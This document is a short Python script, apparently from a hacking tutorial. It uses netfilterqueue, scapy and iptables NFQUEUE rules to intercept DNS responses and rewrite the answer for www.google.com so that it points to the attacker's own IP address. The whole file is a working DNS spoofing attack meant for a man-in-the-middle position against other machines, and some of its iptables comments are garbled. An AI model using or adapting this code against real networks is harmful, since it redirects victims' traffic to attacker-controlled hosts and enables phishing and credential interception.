# for remote computer set the following ip table rules
# set the iptable rule before running the program
# iptables -I FORWARD -j NFQUEUE --queue-num 0

# for experimenitng locally, set the following ip table rules
# iptables - I INPUT - j NFQUEUE - -queue - num 0
# # iptables - I OUTPUT - j NFQUEUE - -queue - num 0
# after finishing spoofing 
# iptables --flush


import netfilterqueue
import scapy.all as scapy
import socket

def read_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.google.com" in qname:
            print("Spoofing Target .......")
            answer = scapy.DNSRR(rrname=qname,rdata=ipaddress)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()
    pass


if __name__ == '__main__':
    ipaddress = socket.gethostbyname(socket.gethostname())
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, read_packet)
    queue.run()
